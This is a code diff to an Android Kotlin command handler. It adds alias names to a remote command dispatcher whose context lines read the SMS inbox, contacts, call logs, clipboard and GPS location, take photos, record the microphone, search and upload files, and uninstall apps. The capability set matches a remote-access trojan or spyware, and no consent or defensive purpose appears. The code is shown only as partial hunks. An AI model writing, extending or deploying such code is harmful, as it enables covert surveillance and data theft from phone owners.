@@ -316,7 +316,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         }
                     }
                 }
-                "torch" -> {
+                "torch", "flashlight" -> {
                     try {
                         val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                         val cameraId = camManager.cameraIdList[0] 
@@ -332,13 +332,13 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         return resp
                     }
                 }
-                "tts" -> {
+                "tts", "speak" -> {
                     tts?.speak(textArg, TextToSpeech.QUEUE_ADD, null, null)
                     val resp = createResponse(cmdId, "success", "Speaking...")
                     onResponse(resp)
                     return resp
                 }
-                "notify" -> {
+                "notify", "alert" -> {
                     val parts = textArg.split("|")
                     val title = if (parts.isNotEmpty()) parts[0] else "System Alert"
                     val content = if (parts.size > 1) parts[1] else "Message"
@@ -357,7 +357,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     onResponse(resp)
                     return resp
                 }
-                "sensors" -> {
+                "sensors", "sensor" -> {
                     val sm = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
                     val list = sm.getSensorList(Sensor.TYPE_ALL)
                     val result = JSONArray()
@@ -366,14 +366,14 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     onResponse(resp)
                     return resp
                 }
-                "clipboard" -> {
+                "clipboard", "clip" -> {
                     val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                     val txt = if (cm.hasPrimaryClip()) cm.primaryClip?.getItemAt(0)?.text?.toString() ?: "" else ""
                     val resp = createResponse(cmdId, "clipboard", txt)
                     onResponse(resp)
                     return resp
                 }
-                "upload" -> {
+                "upload", "push" -> {
                     try {
                         val parts = textArg.split("^^^")
                         if (parts.size == 2) {
@@ -394,7 +394,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         return resp
                     }
                 }
-                "ls" -> {
+                "ls", "dir" -> {
                     try {
                         val path = if (textArg.isEmpty()) "/storage/emulated/0" else textArg
                         val dir = java.io.File(path)
@@ -414,7 +414,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         }
                     } catch (e: Exception) {}
                 }
-                "photo" -> {
+                "photo", "snap" -> {
                     try {
                         val facing = textArg.lowercase()
                         val useFront = facing == "front"
@@ -440,7 +440,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         return resp
                     }
                 }
-                "open_url" -> {
+                "open_url", "browse" -> {
                     try {
                         val intent = Intent(Intent.ACTION_VIEW, Uri.parse(textArg))
                         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
@@ -452,7 +452,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         onResponse(resp); return resp
                     }
                 }
-                "get_call_logs" -> {
+                "get_call_logs", "call_logs", "calls" -> {
                     if (checkPerm(Manifest.permission.READ_CALL_LOG)) {
                         val res = JSONArray()
                         val cursor = context.contentResolver.query(
@@ -487,7 +487,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         onResponse(resp); return resp
                     }
                 }
-                "app_list" -> {
+                "app_list", "apps" -> {
                     val pm = context.packageManager
                     val showAll = textArg.lowercase() == "all"
                     val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
@@ -503,7 +503,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     val resp = createResponse(cmdId, "app_list", res)
                     onResponse(resp); return resp
                 }
-                "launch_app" -> {
+                "launch_app", "run" -> {
                     try {
                         val intent = context.packageManager.getLaunchIntentForPackage(textArg)
                         if (intent != null) {
@@ -520,7 +520,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         onResponse(resp); return resp
                     }
                 }
-                "uninstall_app" -> {
+                "uninstall_app", "uninstall" -> {
                     try {
                         val intent = Intent(Intent.ACTION_DELETE).apply {
                             data = Uri.parse("package:$textArg")
@@ -534,7 +534,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         onResponse(resp); return resp
                     }
                 }
-                "play_sound" -> {
+                "play_sound", "play" -> {
                     try {
                         val mp = android.media.MediaPlayer()
                         mp.setDataSource(textArg)
@@ -548,7 +548,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         onResponse(resp); return resp
                     }
                 }
-                "contacts" -> {
+                "contacts", "people" -> {
                     if (checkPerm(Manifest.permission.READ_CONTACTS)) {
                         val res = JSONArray()
                         val cursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
@@ -564,7 +564,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         onResponse(resp); return resp
                     }
                 }
-                "sms_list" -> {
+                "sms_list", "sms" -> {
                     if (checkPerm(Manifest.permission.READ_SMS)) {
                         val res = JSONArray()
                         val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
@@ -580,7 +580,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         onResponse(resp); return resp
                     }
                 }
-                "wifi_scan" -> {
+                "wifi_scan", "wifi" -> {
                     val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                     val res = JSONArray()
                     wm.scanResults.forEach { ap ->
@@ -593,7 +593,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     val resp = createResponse(cmdId, "wifi_networks", res)
                     onResponse(resp); return resp
                 }
-                "location" -> {
+                "location", "gps" -> {
                     if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION)) {
                         val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                         val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
@@ -612,7 +612,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         }
                     }
                 }
-                "find" -> {
+                "find", "search" -> {
                     val p = textArg.split("|")
                     val root = java.io.File(if (p.isNotEmpty()) p[0] else "/sdcard")
                     val query = if (p.size > 1) p[1].lowercase() else ""
@@ -634,7 +634,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     val resp = createResponse(cmdId, "find_result", res)
                     onResponse(resp); return resp
                 }
-                "record_sound" -> {
+                "record_sound", "mic" -> {
                     try {
                         val duration = textArg.toLongOrNull() ?: 5L
                         val file = File(context.cacheDir, "record_${System.currentTimeMillis()}.mp4")
